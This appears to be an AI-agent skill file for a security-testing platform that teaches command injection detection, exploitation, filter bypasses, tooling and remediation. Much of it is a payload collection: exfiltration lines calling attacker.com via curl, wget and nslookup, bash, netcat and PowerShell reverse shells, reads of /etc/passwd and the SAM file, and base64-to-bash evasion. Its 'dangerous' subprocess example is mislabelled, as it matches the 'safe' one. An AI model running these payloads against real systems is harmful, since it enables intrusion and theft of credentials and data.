---
name: command-injection-testing
description: Professional skills and methodology for command injection vulnerability testing
version: 1.0.0
---

# Command Injection Vulnerability Testing

## Overview

Command injection is a vulnerability that allows system commands to be executed through an application. When an application passes user input directly into a system command, an attacker can execute arbitrary commands. This skill provides methods for detecting, exploiting, and defending against command injection.

## How the Vulnerability Works

When an application invokes a system command without adequately validating and filtering user input, an attacker can inject additional commands.

**Example of dangerous code:**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## Testing Methods

### 1. Identify Command Execution Points

**Common features:**
- Ping functionality
- DNS lookup
- File operations
- System information
- Log viewing
- Backup and restore

### 2. Basic Detection

**Test command separators:**
```
;  # command separator (Linux/Windows)
&  # background execution (Linux/Windows)
|  # pipe (Linux/Windows)
&& # logical AND (Linux/Windows)
|| # logical OR (Linux/Windows)
`  # command substitution (Linux)
$() # command substitution (Linux)
```

**Test payloads:**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. Blind Command Injection

**Time-delay detection:**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

**Out-of-band data:**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
127.0.0.1 && wget http://attacker.com/$(cat /etc/passwd)
```

**DNS exfiltration:**
```
127.0.0.1; nslookup $(whoami).attacker.com
```

## Exploitation Techniques

### Basic Command Execution

**Linux:**
```
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la
```

**Windows:**
```
& whoami
& ipconfig
& type C:\Windows\System32\drivers\etc\hosts
& dir
```

### File Operations

**Read files:**
```
; cat /etc/passwd
; type C:\Windows\System32\config\sam
; head -n 20 /var/log/apache2/access.log
```

**Write files:**
```
; echo "<?php phpinfo(); ?>" > /tmp/shell.php
; echo "test" > C:\temp\test.txt
```

### Reverse Shell

**Bash:**
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Netcat:**
```
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**PowerShell:**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bypass Techniques

### Space Bypass

```
${IFS}id
${IFS}whoami
$IFS$9id
<>
%09 (Tab)
%20 (Space)
```

### Command Separator Bypass

**Encoding bypass:**
```
%3b (;)
%26 (&)
%7c (|)
```

**Newline bypass:**
```
%0a (newline)
%0d (carriage return)
```

### Keyword Filter Bypass

**Variable concatenation:**
```bash
a=w;b=ho;c=ami;$a$b$c
```

**Wildcards:**
```bash
/bin/c?t /etc/passwd
/usr/bin/ca* /etc/passwd
```

**Quote bypass:**
```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

**Backslash:**
```bash
w\ho\am\i
```

**Base64 encoding:**
```bash
echo "d2hvYW1p" | base64 -d | bash
```

### Length Limit Bypass

**Using a file:**
```bash
echo "id" > /tmp/c
sh /tmp/c
```

**Using environment variables:**
```bash
export x='id';$x
```

## Tool Usage

### Commix

```bash
# Basic scan
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# Specify the injection point
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# Get a shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

### Burp Suite

1. Intercept the request
2. Send it to Intruder
3. Use a command injection payload list
4. Observe the response or time delay

## Verification and Reporting

### Verification Steps

1. Confirm that system commands can be executed
2. Verify the command execution results
3. Assess impact (system control, data leakage, etc.)
4. Record a complete PoC
5. Use the `report_finding` tool to record confirmed vulnerabilities into the platform (the only entry point for recording vulnerabilities on this platform), with fields covering location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Key Points

- Vulnerability location and input parameters
- Types of commands that can be executed
- Complete exploitation steps and PoC
- Remediation recommendations (input validation, parameterization, whitelisting, etc.)

## Protective Measures

### Recommended Solutions

1. **Avoid command execution**
   - Use APIs instead of system commands
   - Use library functions instead of commands

2. **Input validation**
   ```python
   import re
   
   def validate_ip(ip):
       pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
       if not re.match(pattern, ip):
           raise ValueError("Invalid IP")
       parts = ip.split('.')
       if not all(0 <= int(p) <= 255 for p in parts):
           raise ValueError("Invalid IP range")
       return ip
   ```

3. **Parameterized commands**
   ```python
   import subprocess
   
   # Dangerous
   subprocess.call(['ping', '-c', '1', user_input])
   
   # Safe - use an argument list
   subprocess.call(['ping', '-c', '1', validated_ip])
   ```

4. **Whitelist validation**
   ```python
   ALLOWED_COMMANDS = ['ping', 'nslookup']
   ALLOWED_OPTIONS = {'ping': ['-c', '-n']}
   
   if command not in ALLOWED_COMMANDS:
       raise ValueError("Command not allowed")
   ```

5. **Least privilege**
   - Run the application as a low-privilege user
   - Restrict file system access
   - Use chroot or container isolation

6. **Output filtering**
   - Limit output content
   - Filter sensitive information
   - Log command execution

## Notes

- Only perform testing in authorized environments
- Avoid causing damage to the system
- Be aware of command differences across operating systems
- Watch the impact scope of command execution during testing
